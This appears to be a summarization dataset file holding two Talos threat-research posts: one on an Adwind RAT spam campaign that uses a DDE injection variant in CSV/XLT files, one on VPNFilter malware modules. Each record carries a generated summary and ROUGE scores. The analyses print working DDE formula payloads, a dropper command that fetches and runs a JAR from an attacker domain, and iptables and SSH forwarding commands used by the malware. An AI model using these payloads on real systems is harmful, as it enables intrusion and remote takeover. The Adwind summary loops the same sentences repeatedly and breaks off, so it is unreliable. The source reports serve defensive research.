https://blog.talosintelligence.com/adwind-dodgesav-dde/;Adwind Dodges AV via DDE;"This blog post is authored byPaul Rascagneres, Vitor Ventura and with the contribution of Tomislav Pericin and Robert Perica from ReversingLabs.IntroductionCisco Talos, along with fellow cybersecurity firm ReversingLabs, recently discovered a new spam campaign that is spreading the Adwind 3.0 remote access tool (RAT), targeting the three major desktop operating systems (Linux, Windows and Mac OSX). This new campaign, first discovered by ReversingLabs on Sept. 10, appears to be a variant of the Dynamic Data Exchange (DDE) code injection attack on Microsoft Excel that has appeared in the wild in the past. This time, the variant is able to avoid detection by malware-blocking software. ReversingLabs has written their own blog on this issue here.The majority of the targets in this campaign are in Turkey, according to data from the Cisco Umbrella cloud security platform. After our research, we have discovered important details about this attack, as well as the malicious, forged Microsoft Office documents that the attackers are using.Spam campaignOur Umbrella telemetry shows that this campaign started on Aug. 26, 2018, peaking on Aug. 28.DNS query hitsUmbrella also shows that 75 percent of the requests were made from Turkey. This is no surprise, considering the language in the spam emails is Turkish. Some of the targets were also located in Germany, which makes sense given that there is a significant Turkish community in Germany. The attackers tempt the user with an email about the cost of footwear in this particular example below.Sample of spam emailIn the screenshot above, we can see a CSV file is attached. We identified attachments with the .XLT extension, too -- please see the ""Microsoft Office Dropper"" section for additional details.Microsoft Office DropperWe have seen at least two different droppers in this campaign. They use either the .csv or .xlt extensions, which are opened by default by Microsoft Excel. Both versions were leveraging a new variant to the DDE code injection attack. Although this method is well-known, this variant is undetected at the time of this writing.The dropper implementing this method will have the following internal format:<random quantity of data><special byte><code to be executed><random quantity of data>Here is a breakdown of what this format means:<random quantity of data> -- Random data in any quantity -- the last is optional. Not necessarily ASCII characters.<special byte> -- 0x0A (New Line) or 0x0D (Carriage Return), these special bytes are interpreted by Excel as new lines, putting any data that follows on the first cell of the next row.<code to be executed> -- the executed command must start by ""="", ""+"", ""-"" or be included in a function (such as @SUM()). The command format is command|'argument'!cell. The cell does not need to be a valid one. For example:=calc|' '!A0 +msiexec|' /q /i C:\Users\user\Downloads\file.msi'!A0 @SUM(calc|' '!A0)The dropper file can have any of the extensions in the table below. Not all of the extensions will be opened by Microsoft Excel by default. However, for the non-default extensions, a script starting Excel with a file with one of these extensions as a parameter is still a viable attack scenario.Formats like CSV doesn't have a predefined header, thus it can contain any kind of data at the beginning. Having random data like in the samples we found my trick the anti-virus into skip the file scanning. Other formats may be considered corrupted, as they might not follow the expected format.Here is an example:00000830 47 fc c9 c8 5f 27 5b 6e 4e e2 d6 88 21 24 cc 27 |G..._'[nN...!$.'| 00000840 88 7e 5e bf 40 c2 e9 cd 8a f2 9f 2c b7 d9 b5 a8 |.~^.@......,....| 00000850 2a c6 98 0d 0a 3d 63 6d 64 7c 27 20 2f 63 20 40 |*....=cmd|' /c @| 00000860 65 63 68 6f 20 53 65 74 20 57 58 57 59 4b 4e 52 |echo Set WXWYKNR| 00000870 47 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 |G = CreateObject| 00000880 28 22 57 73 63 72 69 70 74 2e 53 68 65 6c 6c 22 |(""Wscript.Shell""| 00000890 29 20 3e 20 4e 4d 55 57 59 54 47 4f 2e 76 62 73 |) > NMUWYTGO.vbs| 000008a0 20 26 20 40 65 63 68 6f 20 57 58 57 59 4b 4e 52 | & @echo WXWYKNR| 000008b0 47 2e 52 75 6e 20 22 63 6d 64 20 2f 63 20 62 69 |G.Run ""cmd /c bi| 000008c0 74 73 61 64 6d 69 6e 20 2f 74 72 61 6e 73 66 65 |tsadmin /transfe| 000008d0 72 20 38 20 2f 64 6f 77 6e 6c 6f 61 64 20 68 74 |r 8 /download ht| 000008e0 74 70 3a 2f 2f 65 72 61 79 69 6e 73 61 61 74 2e |tp://erayinsaat.| 000008f0 6c 69 76 65 20 25 74 65 6d 70 25 5c 4e 4d 55 57 |live %temp%\NMUW| 00000900 59 54 47 4f 2e 6a 61 72 26 25 74 65 6d 70 25 5c |YTGO.jar&%temp%\| 00000910 4e 4d 55 57 59 54 47 4f 2e 6a 61 72 22 2c 30 2c |NMUWYTGO.jar"",0,| 00000920 54 72 75 65 20 3e 3e 20 4e 4d 55 57 59 54 47 4f |True >> NMUWYTGO| 00000930 2e 76 62 73 26 20 4e 4d 55 57 59 54 47 4f 2e 76 |.vbs& NMUWYTGO.v| 00000940 62 73 27 21 41 30 0d 0a 6e e3 b0 c6 a3 40 b4 fb |bs'!A0..n....@..|Example of a dropperExcel will display warnings to the user regarding the execution of code. Here is an example where the payload is executing ""calc.exe:""Excel corruption warning upon executionAs you can see, Excel detects that the opened file is not a real XLT document. It explains that the file is probably corrupted and asks the user if they are sure they want to open it.Command execution warningThe second warning notifies the user that the document will execute the application ""CMD.exe.""Calc executionIf the user accepts the three warnings, the system will open the calculator application.In this campaign, the purpose of the injected code was to create and execute a VBScript with the following content:Set WXWYKNRG = CreateObject(""Wscript.Shell"") WXWYKNRG.Run ""cmd /c bitsadmin /transfer 8 /download hxxp://erayinsaat[.]live %temp%\NMUWYTGO.jar&%temp%\NMUWYTGO.jar"",0,TrueThe script uses bitasdmin, a tool provided by Microsoft to download or upload jobs and monitor their progress, to get the final payload. This payload is a Java archive file.Java PayloadThe Java code is packed with the demo version of a commercial packer named ""Allatori Obfuscator version 4.7.""Packer bannerWe identified the packed malware as Adwind RAT v3.0.Adwind configurationIt's a well-known multiplatform RAT with several configurations possible. The samples we tested were configured to achieve persistence on Windows, Linux and Mac OSX. Each platform has its own persistence name (see IOC section).This RAT is used by several malicious groups. It gives its operators the ability to execute any kind of commands on its victims, log keystroke, take screenshots, take pictures or transfer files. In the past, it has been used to run cryptocurrency mining campaigns and in a separate attack that targeted the aviation industry.ConclusionThe DDE variant used by the droppers in this campaign is a good example of how signature-based antivirus software can be tricked. It is also a warning sign regarding file extension-scanning configurations. This kind of injection has been known for years, however, this actor found a way to modify it in order to have an extremely low detection ratio. The malicious actor used a well-known multiplatform RAT with a wide range of capabilities -- a ""field proven"" RAT that ensured it would work as designed and go undetected. Although both the generic method and the payload are known, this campaign shows how some variance in well-known artifacts can trick antivirus software. Their behavior, however, is clearly classical, which means that sandboxing- and behavior-based solutions aligned with intent-based networks should be able to detect and stop these threats without problems.CoverageAdditional ways our customers can detect and block this threat are listed below.(AMP) is ideally suited to prevent the execution of the malware used by these threat actors.Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as Next-Generation Firewall (NGFW),Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IOCsURLshxxp://avrasyagrup[.]livehxxp://avrasyayapi[.]livehxxp://birlikholding[.]livehxxp://erayinsaat[.]livehxxp://qakeyewoha[.]clubhxxp://yeyamohofe[.]clubHashesOffice Documents  Payload0a2f74a7787ae904e5a22a3c2b3acf0316c10b95fae08cced7ca5e2fcc7d9bf80af2c5a46df16b98b9ab5af0ec455e98f6e1928c10ed8b6ffec69573498bdd8a65220dae459432deb1b038dbcbf8a379519a1a797b7b72f6408f94733bc5a2c293280872f685f9c26d5f668ca1303f224a38d2b86ba707cdbb3d57427396e75293a482e554e2a37e6893fdd8cd92537c0ebc7363ac5fac44b7a4af4a2088ea24";"The ITSecurity report summarizes that the malicious actor used a wellknown multiplatform RAT with a wide range of capabilities a ""field proven"" RAT that ensured it would work as designed and go undetected. Although both the generic method and the payload are known, this campaign shows how some variance in wellknown artifacts can trick antivirus software. The malicious actor used a wellknown multiplatform RAT with a wide range of capabilities a ""field proven"" RAT that ensured it would work as designed and go undetected. Although both the generic method and the payload are known, this campaign shows how some variance in wellknown artifacts can trick antivirus software. The malicious actor used a wellknown multiplatform RAT with a wide range of capabilities a ""field proven"" RAT that ensured it would work as designed and go undetected. Although both the generic method and the payload are known, this campaign shows how some variance in wellknown artifacts can trick antivirus software. The malicious actor used a wellknown multiplatform RAT with a wide range of capabilities a ""field proven"" RAT that ensured it would work as designed and go undetected. Although both the generic method and the payload are known, this campaign shows how some variance in wellknown artifacts can trick antivirus software. The malicious actor used a wellknown multiplatform RAT with a wide range of capabilities a ""field proven"" RAT that ensured it would work as designed and go undetected. Although both the generic method and the payload are known, this campaign shows how some variance in wellknown artifacts can trick antivirus software. The malicious actor used a wellknown multiplatform RAT with a wide range of capabilities a ""field proven"" RAT that ensured it would work as designed and go";en;{'r': 0.05913978494623656, 'p': 0.9166666666666666, 'f': 0.11111110997245179};{'r': 0.03425167535368578, 'p': 0.8070175438596491, 'f': 0.06571428493315307};{'r': 0.05913978494623656, 'p': 0.9166666666666666, 'f': 0.11111110997245179}
https://blog.talosintelligence.com/vpnfilter-part-3/;VPNFilter III: More Tools for the Swiss Army Knife of Malware;" codeSummaryVPNFilter -- a multi-stage, modular framework that has infected hundreds of thousands of network devices across the globe -- is now known to possess even greater capabilities. Cisco Talos recently discovered seven additional third-stage VPNFilter modules that add significant functionality to the malware, including an expanded ability to exploit endpoint devices from footholds on compromised network devices. The new functions also include data filtering and multiple encrypted tunneling capabilities to mask command and control (C2) and data exfiltration traffic. And while we believe our work, and the work of our international coalition of partners, has mostly neutralized the threat from VPNFilter, it can still be difficult to detect in the wild if any devices remain unpatched.Talos has been researching VPNFilter for months. Our initial findings are outlined here, and a description of additional modules used by the framework is here. As part of our continued investigation, we developed a technique to examine a key protocol used by MikroTik networking devices to hunt for possible exploitation methods used by the actor.As we followed the thread of VPNFilter infections, it became clear that MikroTik network devices were heavily targeted by the threat actor, especially in Ukraine. Since these devices seemed to be critical to the actor's operational goals, this led us to try to understand how they were being exploited. Part of our investigation included the study of the protocol used by MikroTik's Winbox administration utility. In this blog, we'll share how and why we studied this protocol, as well as the decoder tool we developed as a way of helping the security community look into this protocol for potential malicious actor activity.The sophistication of VPNFilter drives home the point that this is a framework that all individuals and organizations should be tracking. Only an advanced and organized defense can combat these kinds of threats, and at the scale that VPNFilter is at, we cannot afford to overlook these new discoveries.Expanded VPNFilter capabilitiesThe discovery of these additional VPNFilter third-stage modules has significantly added to our understanding of what we already knew to be an extremely potent threat. Together, these modules added:Additional capabilities that could be leveraged to map networks and exploit endpoint systems that are connected to devices compromised by VPNFilter. Multiple ways for the threat actor to obfuscate and/or encrypt malicious traffic, including communications used for C2 and data exfiltration. Multiple tools that could be utilized to identify additional victims accessible from the actor's foothold on devices compromised by VPNFilter for both lateral movement within a network, as well as to identify new edge devices in other networks of interest to the actor. The capacity to build a distributed network of proxies that could be leveraged in future unrelated attacks to provide a means of obfuscating the true source of attack traffic by making it appear as if the attacks originated from devices previously compromised by VPNFilter.We were able to confirm the existence and capabilities of the malware after reverse-engineering these additional modules. Previously, we had to make analytic assessments on the existence and nature of these capabilities based solely on telemetry analysis, which always leaves room for error.For example, we had previously noted what appeared to be devices compromised by VPNFilter conducting scans of large IP spaces that seemed focused on identifying other devices vulnerable to the methods of exploitation used by the actor associated with the VPNFilter malware. However, now we can discuss the specific third-stage module used for this activity.As a result of our continued research, we have furthered our understanding of the full scope of the capabilities associated with VPNFilter after examining these additional third-stage modules.Additional third-stage modulesAs previously described, Talos identified the following seven additional third-stage modules that greatly expanded the capabilities present within VPNFilter.Each of these modules is described in detail in the following sections.'htpx' (endpoint exploitation module - executable injection)htpx is a third-stage module for VPNFilter. This module shares similar code with the 'ssler' module previously documented by Talos. The module relies heavily on open-source code that can be traced to the original projects based on strings present within the binary. A good example is 'libiptc.c', which is part of Netfilter.Comparison of strings between 'htpx' (left) and 'ssler' (right).The primary function present within the 'htpx' module is responsible for setting up iptables rules to forward network traffic destined for TCP port 80 to a local server running on port 8888. This redirection is accomplished by first loading kernel modules that allow for traffic management. These modules ( Ip_tables.ko , Iptable_filter.ko , and Iptable_nat.ko ) are loaded with the insmod shell command.The htpx module then issues the following commands to surreptitiously forward traffic:iptables -I INPUT -p tcp --dport 8888 -j ACCEPTiptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888It also periodically checks to ensure that these rules remain present by issuing similar delete commands then re-adding them. A temp file is also created called /var/run/htpx.pid .The following HTTP request is then generated:GET %s HTTP/1.1\rHost: 103.6.146.194\rAccept: */*\rUser-Agent: curl53\r\rDuring our analysis of the 'htpx' module, we were unable to elicit a response from C2 infrastructure, so we were unable to observe additional module operations. During our analysis of the module binary, we identified that the module inspects HTTP communications to identify the presence of Windows executables. When they are encountered, the executable is flagged and added to a table. We assess with moderate confidence that this module could be leveraged by attackers to download a binary payload and allow for on-the-fly patching of Windows executables as they pass through compromised devices.'ndbr' (multi-functional SSH tool)The ndbr module is a module with SSH capabilities that also has the ability to port-scan other IPs. This module uses the dropbear SSH server and client and is a modified version of the dbmulti utility version 2017.75. We have identified several modifications to the standard dropbear functionality.The first modifications are to the dbmulti utility itself. The typical utility can function as an SSH client, SSH server, perform data transfers using SCP, generate keys, or convert keys. The functionality is determined either by the program name or the first parameter passed to the program. The 'ndbr' module has replaced the ability to generate or convert keys with a network mapping (i.e., port-scanning) function as well as another function called 'ndbr.'Like the original ""dbmulti"" utility, the ndbr module's functionality depends either on the name of the program or the first argument passed to the program. The arguments that the ndbr module accepts are dropbear, dbclient, ssh, scp, ndbr , and nmap . A description of each of these arguments can be found in the following sections.dropbearThe dropbear command instructs the 'ndbr' module to operate as an SSH server. The original dropbear code uses the default SSH port (TCP/22) to listen for connections. However, the code present within the 'ndbr' module has been modified to use a default port of TCP/63914. Other modifications to the original dropbear code change the way that host keyfiles are handled. The default keyfile path has been changed to /db_key, but the 'ndbr' module does not drop this file. Instead, the buf_readfile dropbear function has been modified to load the proper key from memory when the filename parameter is equal to /db_key.Instead of using password-based authentication, the dropbear server has been modified to authenticate via a proper public key, which is also embedded in the 'ndbr' executable. A bug in this modified code mishandles connections attempting to use an incorrect public key. These authentication failures cause the ndbr SSH server to become stuck in an infinite loop. There is no indication to the client, however, that the authentication has failed. At this time, we have been unable to identify a correct key that would allow for successful authentication with the ndbr SSH server -- neither of the keys embedded in the 'ndbr' module (i.e., /db_key and /cli_key ) were correct, and no corresponding keys were found in any other VPNFilter-related binaries.dbclient (ssh)If passed the dbclient or ssh parameter, the 'ndbr' module acts as the standard dropbear SSH command-line interface client but with modifications to its default options. As with the default keyfile with dropbear server command, the dbclient/ssh commands have a default identity file: /cli_key . At this time, we do not know what the dbclient (SSH client) is expected to connect to.nmapIf passed the nmap argument, the ndbr module will perform a port scan of an IP or range of IPs.The usage is: codeUsage %s -ip* <ip-addr: 192.168.0.1/ip-range 192.168.0.0./24> -p* <port: 80/port-range: 25-125> -noping <default yes> -tcp <default syn> -s <source ip> -h/--help (print this help)ndbrIf passed the ndbr argument, the 'ndbr' module will do one of three operations based on the other parameters it is passed. The SSH commands will make use of the default keys (i.e., /db_key and /cli_key ) as described above.The third parameter must begin with the word start or the ndbr module uninstalls itself.If the ndbr module is executed using the following parameters:$ ./ndbr_<arch> ndbr <param1> <param2> ""start proxy <host> <port>""The following dropbear SSH command will be executed:ssh -y -p <port> prx@<host> srv_ping j(<B64 victim host name>)_<victim MAC address> <param2>This causes the dropbear SSH client to connect to a remote host and issue the ""srv_ping"" command, which is likely used to register the victim with a C2 server.If the ndbr module is executed using the following parameters:$ ./ndbr_<arch> ndbr <param1> <param2> ""start -l <port>""The dropbear SSH server (as described above) is started and begins listening on the port specified:sshd -p <port>If the ndbr module is executed with the following parameters:$ ./ndbr_<arch> ndbr <param1> <param2> ""start <user> <host> <port>""Remote port forwarding is set up by executing the following dropbear command (see above for explanation of the command options):sshd -p <port>ssh -N -T -y -p <port> -R :127.0.0.1:63914 <user>@<host>'nm' (network mapper)The 'nm' module is used to scan and map the local subnet. It iterates through all interfaces and starts by ARP scanning for all hosts on the subnet associated with each IP assigned to the interface. Once an ARP reply is received, nm will send an ICMP echo request to the discovered host. If an ICMP echo reply is received it will continue mapping by performing a port scan, trying to connect to the following remote TCP ports on the host: 9, 21, 22, 23, 25, 37, 42, 43, 53, 69, 70, 79, 80, 88, 103, 110, 115, 118, 123, 137, 138, 139, 143, 150, 156, 161, 190, 197, 389, 443, 445, 515, 546, 547, 569, 3306, 8080 or 8291.Next, it uses the MikroTik Network Discovery Protocol (MNDP) to locate any other MikroTik devices on the local network. If a MikroTik device replies to the MNDP ping, nm extracts the MAC address, system identity, version number, platform type, uptime in seconds, RouterOS software ID, RouterBoard model, and interface name from the discovered device.The nm module looks in /proc/net/arp to get information about the infected device's ARP table, revealing the IP and MAC addresses of neighboring devices. Next, the entire contents of /proc/net/wireless are gathered.The module performs a traceroute by first creating a TCP connection to 8.8.8.8:53 to confirm its availability (no data is sent), then ICMP echo requests are repeatedly sent to this IP with increasing TTLs.All of the network information that is gathered is saved to a temporary file named /var/run/repsc_<time stamp>.bin. An example .bin file is as follows:The code responsible for the SSDP, CDP and LLDP functions was present within the module but was never called in the samples analyzed and therefore will always be empty.The nm module requires three command line arguments to operate properly, but only the first parameter is used. Like several other modules, the first parameter is a folder, and this is the location where the data is permanently saved. The final task performed by the nm module is the moving of the temporary .bin file containing the results of the scan to a folder specified as the first command line argument, ostensibly for later exfiltration by the main VPNFilter process.'netfilter' (denial-of-service utility)netfilter expects three arguments to be given on the command line. The first two arguments are unused, and the third argument is a quoted string in the format ""<block/unblock> < of minutes>.""  of minutes' is how long netfilter should execute for before exiting. If block was used as the first part of the third argument, netfilter adds the following rule to iptables:Chain FORWARD (policy ACCEPT) target prot opt source destination DROP tcp -- anywhere anywhere tcpflags: PSH/PSHAfter adding this rule, netfilter waits 30 seconds and then deletes this rule. If there is still time remaining based on the  of minutes value, this process begins again. The addition and deletion loop ensures that the rule persists in the event the rule is deleted from the device.Once the number of minutes has elapsed, the program exits. Signal handlers are also installed at the beginning of the netfilter program that deletes the iptables rule and then exit if the program receives either a SIGINT or SIGTERM. This is done so the device works as normal in the event someone manually terminates the netfilter program.Finally, the 'unblock' argument can be used to delete the iptables rule that was previously added using the 'block' argument.Although there are no other code paths possible, there are indications that there is or could have been something more to this module.The first indicator is that all of the different netfilter module samples that Talos analyzed (MIPS, PPC, Tile-GX) contain the same list of 168 CIDR IP addresses and ranges which tie to the following companies/services:31.13.64.51 - WhatsApp169.44.36.0/25 - WhatsApp203.205.167.0/24 - Tencent (Owner of QQ Chat)52.0.0.0/16 - Amazon.com, Inc. (The following encrypted applications have used multiple IPs in this range: Wikr, Signal, Dust and Confide)This indicates that the netfilter module may have been designed to deny access to specific forms of encrypted applications, possibly in an attempt to herd victim communications to a service that the actor preferred they use. Interestingly, Telegram, an extremely popular encrypted chat application, is missing from the list.However, we were unable to find any references to these strings in the code. All versions of netfilter that we have samples for have this same IP range list but do not appear to use it. It's possible that the samples we have are incomplete.The iptables rule that is added by the netfilter module drops TCP packets with the PUSH flag set. This rule would likely use iptables rules that block all packets not just TCP packets with the PUSH flag set if its purpose is to provide attackers with the ability to launch denial-of-service attacks using compromised devices. Typically, a rule like this would be useful as part of a man-in-the-middle attack enabling attackers with access to the devices to intercept forwarded traffic, manipulate it, then manually forward it. This might explain the list of CIDR ranges as a list of IPs to intercept. We were unable to locate any indication of this sort of functionality present within the samples that were analyzed.We have concluded that the IPs are not used. This may be due to them being left over from an older version of the netfilter module, functionality that has not yet been implemented, or there may be modifications to the statically linked iptables library made by the malware authors that we haven't found yet. The VPNFilter authors have modified open-source code before (e.g. the ndbr module), so it's not unexpected that they would change the libiptc code linked in the netfilter module.'portforwarding' (Allows the forwarding of network traffic to attacker specified infrastructure)The portforwarding module is designed to be executed with the following command line arguments:./portforwarding <unused> <unused> ""start <IP1> <PORT1> <IP2> <PORT2>""Given these arguments, the portforwarding module will forward traffic from a particular port and IP combination to another port and IP by installing the following iptables rules:iptables -t nat -I PREROUTING 1 -p tcp -m tcp -d <IP1> --dport <PORT1> -j DNAT --to-destination <IP2>:<PORT2>iptables -t nat -I POSTROUTING 1 -p tcp -m tcp -d <IP2> --dport <PORT2> -j SNAT --to-source <device IP>These rules cause any traffic passing through the infected device that is destined to IP1:PORT1 to be redirected to IP2:PORT2 instead. The second rule then changes the source address of the rerouted traffic to that of the infected device to ensure the responses are sent back to the infected device.As a precaution, before installing the iptables rules, the portforwarding module first checks that IP2 is available by creating a socket connection to IP2 on PORT2. However, no data is sent before the socket is closed.Like other modules that manipulate iptables, the portforwarding module enters a loop that adds the rules, waits a period of time, deletes the rules and then adds them again to ensure that the rules persist on the device even if they are manually deleted.'socks5proxy' (Enables establishment of a SOCKS5 proxy on compromised devices)The socks5proxy module is a SOCKS5 proxy server that appears to be based on the open-source project shadowsocks. The server uses no authentication and is hardcoded to listen on TCP port 5380. Before the server is started, socks5proxy forks to connect to a C2 server specified in arguments supplied to the module. If the server does not respond within a few seconds, the fork kills its parent process (the server) and then exits. The C2 server can respond with commands to execute normally or terminate the server.This module contains the following usage strings, though they do not line up with the arguments for the socks5proxy module, and these settings cannot be modified through command line arguments:ssserver --username <username> username for auth --password <password> password for auth -p, --port <port> server port, default to 1080 -d run in daemon --loglevel <level> log levels: fatal, error, warning, info, debug, trace -h, --help helpThe actual command line arguments for the socks5proxy module are:./socks5proxy <unused> <unused> ""start <C&C IP> <C&C port>""The socks5proxy module verifies the argument count is greater than 1, but the process crashes with a SIGSEV signal if two arguments are given, indicating that there may be limited or poor quality control during some phases of development for this malware toolchain.'tcpvpn' (Enables establishment of a Reverse-TCP VPN on compromised devices)The tcpvpn module is a Reverse-TCP VPN, designed to allow a remote attacker to access internal networks behind infected devices. It accomplishes this by beaconing to a remote server, which could be set up like a TunTap device to forward packets over the TCP connection. The connection is seen as outbound by network devices, which may help the module bypass simple firewalls or NAT issues. This module is similar in concept to penetration testing software Cobalt Strike's VPN Pivoting.All data sent through the connection is encrypted with RC4, with a key generated by the hardcoded bytes:""213B482A724B7C5F4D77532B45212D215E79433D794A54682E6B653A56796E457A2D7E3B3A2D513B6B515E775E2D7E533B51455A68365E6A67665F34527A7347""Which are sandwiched between the port numbers of the current connection (e.g., ""58586!,H*rK|_MwS+E!-!^yC=yJTh.ke:VynEz-~,:-Q,kQ^w^-~S,QEZh6^jgf_4RzsG80"").The command line syntax associated with the tcpvpn module are:./tcpvpn <unused> <unused> ""start <C&C IP> <C&C port>""MikroTik ResearchIntroducing the Winbox Protocol DissectorDuring our research into VPNFilter, we needed to determine how some of the devices were compromised. While examining the MikroTik series of devices, we noticed an open port (TCP 8291) and that the configuration tool ""Winbox"" uses that port for communication.The traffic from these devices appeared as large blobs of binary data, so we weren't able to determine potential avenues of access using this protocol without a protocol dissector (which to our knowledge, didn't exist publicly). We decided to develop our protocol dissector for use with packet analysis tools such as Wireshark to learn more about the protocol, which would allow us to design effective rules to prevent future infections once potential attack vectors were discovered.An example of such an attack vector is CVE-2018-14847 which allows an attacker to perform a directory traversal for unauthenticated credential recovery. The dissector proved extremely helpful when we wrote coverage for this vulnerability (Snort SID: 47684). While an update for this vulnerability has been released, we think it's essential for security professionals to be able to monitor this traffic to help identify any other potentially malicious traffic.Privacy can still be maintained by ensuring that you either use ""secure mode"" to encrypt communications or download the latest Winbox client which communicates over encrypted channels only. This tool will NOT decrypt encrypted communications. The latest MikroTik CCR firmware version we tested (6.43.2), enforces the usage of this newer Winbox client though this is only enforced client-side. This means that you CAN still communicate over insecure channels using a custom-made client. Therefore, we believe this Wireshark dissector remains useful because an attacker can still deliver an exploit without having to reimplement said secure communications.What is the ""Winbox Protocol?""The term ""Winbox"" comes from the Winbox client offered by MikroTik as an alternative to the web GUI.From the official documentation, Winbox is a small utility that allows for the administration of MikroTik RouterOS using a fast and simple GUI. It is a native Win32 binary but can be run on Linux and MacOS (OSX) using Wine, an open-source compatibility layer. All Winbox interface functions are as close as possible to mirroring the console functions -- that is why there are no Winbox sections in the manual. Some of the advanced and critical system configurations are not possible from Winbox, like changing the MAC address on an interface.The term ""Winbox Protocol"" is not official, as far as we know. It's simply the term we chose since it matches the name of their client.Using the dissectorInstallation is simple, and since this is a LUA-based dissector, recompilation is not necessary. Simply drop the Winbox_Dissector.lua file into your /$HOME/.wireshark/plugins folder. By default, any TCP traffic to or from TCP port 8291 will be properly decoded as Winbox traffic once the dissector is installed.While a single message from the client/server to its destination would be preferable for parsing purposes, this is not always the case and observing live communications proved that there are many ways that Winbox messages can be formatted and sent.Below is an example of a Winbox communications capture that has the following properties:Multiple messages sent in the same packet.Messages containing one or more two-byte ""chunks"" that need to be removed before parsing.Messages too long for a single packet -- TCP reassembly applied.Messages containing additional ""nested"" messagesHere is how the capture is displayed before installing the dissector:The communications are correctly parsed in Wireshark following installation of the Winbox protocol dissector:Obtaining the DissectorTo improve the security community's ability to analyze these communications and to monitor for threats that may attempt to take advantage of the Winbox Protocol, Cisco Talos is releasing this dissector for public use. For additional information and to obtain the dissector, please see the GitHub repository here.ConclusionAs a result of the capabilities we previously discovered in VPNFilter coupled with our new findings, we now confirm that VPNFilter provides attackers all of the functionality required to leverage compromised network and storage devices to further pivot into and attack systems within the network environments that are being targeted.It also allows attackers to leverage their access to sensitive systems such as gateway and routing devices to perform activities such as network mapping and endpoint exploitation, network communications monitoring and traffic manipulation, among other serious threats. Another dangerous capability provided by VPNFilter is the ability to turn compromised devices into proxies that could be leveraged to obfuscate the source of future, unrelated attacks by making it appear as if the attacks originate from networks previously compromised by VPNFilter. The sophisticated nature of this framework further illustrates the advanced capabilities of the threat actors making use of it, as well as the need for organizations to deploy robust defensive architectures to combat threats such as VPNFilter.With this new understanding of VPNFilter, most of our unanswered questions about the malware itself have now been answered. However, there are still significant unknowns about this threat that linger to this day:How did the actor gain initial access to affected devices?While we strongly assess that they utilized widely known, public vulnerabilities based on the makes/models affected by VPNFilter, we still don't have definitive proof of this.Is the actor attempting to reconstitute their access?Based on our telemetry and information from our partners, it appears that VPNFilter has been entirely neutralized since we and our international coalition of partners (law enforcement, intelligence organizations, and the Cyber Threat Alliance) countered the threat earlier this year. Most C2 channels for the malware have been mitigated. The stage 2 implants were non-persistent, so most have likely been cleared from infected devices. We have seen no signs of the actor attempting to reconnect with devices that may still have the persistent stage 1 with an open listener.Does this mean the actor has abandoned this expansive foothold into the small and home office (SOHO) network device space? Are they instead reconstituting their access by starting over, re-exploiting and dropping new unknown malware? Have they given up on having broad worldwide SOHO access in favor of a more tailored approach only going after specific key targets?Whatever the answers may be, we know that the actor behind VPNFilter is extremely capable and driven by their mission priorities to continually maneuver to achieve their goals. In one form or another, they continue to develop and use the tools and frameworks necessary to achieve their mission objective(s).IOCsa43a4a218cf5755ce7a7744702bb45a34321339ab673863bf6f00ac193cf55fc aac52856690468687bbe9e357d02835e9f5226a85eacc19c34ff681c50a6f0d8 13165d9673c240bf43630cddccdc4ab8b5672085520ee12f7596557be02d3605 b81f857cd8efab6e6e5368b1c00d93505808b0db4b773bee1843a3bc948d3f4f 809f93cbcfe5e45fae5d69ca7e64209c02647660d1a79b52ec6d05071b21f61a 7ff2e167370e3458522eaa7b0fb81fe21cd7b9dec1c74e7fb668e92e261086e0 81368d8f30a8b2247d5b1f8974328e9bd491b574285c2f132108a542ea7d38c7 b301d6f2ba8e532b6e219f3d9608a56d643b8f289cfe96d61ab898b4eab0e3f5 99e1db762ff5645050cea4a95dc03eac0db2ceb3e77d8f17b57cd6e294404cc7 76bf646fce8ff9be94d48aad521a483ee49e1cb53cfd5021bb8b933d2c4a7f0f e009b567516b20ef876da6ef4158fad40275a960c1efd24c804883ae273566b0 7c06b032242abefe2442a8d716dddb216ec44ed2d6ce1a60e97d30dbba1fb643 f8080b9bfc1bd829dce94697998a6c98e4eb6c9848b02ec10555279221dd910a 4e350d11b606a7e0f5e88270938f938b6d2f0cc8d62a1fdd709f4a3f1fa2c828 f1cf895d29970c5229b6a640c253b9f306185d4e99f4eac83b7ba1a325ef9fb8 8395e650e94b155bbf4309f777b70fa8fdc44649f3ab335c1dfdfeb0cdee44ff a249a69e692fff9992136914737621f117a7d8d4add6bac5443c002c379fe072 5e75b8b5ebbef78f35b00702ced557cf0f30f68ee08b399fc26a3e3367bb177b fe022403a9d4c899d8d0cb7082679ba608b69091a016e08ad9e750186b1943dd 116d584de3673994e716e86fbb3945e0c6102bfbd30c48b13872a808091e6bc9 4263c93ce53d7f88c62fecb6a948d70e51c19e1049e07df2c70a467bcefee2c8 5d70e7dd5872cc0d7d0f7015c11400e891c939549c01922bff2bbe3b7d5d1ce3 5c52f115ab8a830d402fac8627d0bfdcbbfd4dcf0e6ad8154d49bb85387893aa e75e224c909c9ead4cb50cd772f606407b09b146051bfb28015fcbe27b4a5e8d 999f14044f41adfd9fb6c97c04d7d2fd9af01724b3ab69739acf615654abfa43 b118b23a192f372616efe8c2b12977d379ac76df22493c14361587bd1cc8a804 7ba0dc46510492a7f6c9b2bcc155333898d677cd8a88fe0e1ac1ad3852f1c170 83b3dbf7f6bc5f98151b26781fa892fc1a014c62af18c95ae537848204f413b8 fce03f57b3fd3842efac3ce676687794c4decc29b612068e578134f3c4c4296a 1f26b69a353198bb047dde86d48198be8271e07f8c9d647d2f562207e1330a37 1e824654afba03678f8177e065c487a07192069711eeb4abe397010771b463b5 84227f906c7f49071d6598b9035fc785d2b144a6349d0cf7c29177c00db2dc2f 6eb09f805a68b29c9516d649019bea0bb4796e504ca379783455508a08f61087 aa5baa135b2ada5560833747260545d6a5b49558f6244c0f19443dc87c00294d 4c5e21125738c330af1bfe5cabc5f18fa14bbef53805dda2c3c31974555f7ec5 0f3746f273281472e7181f1dd1237f0c9fc26f576a883f42413c759f381006c4 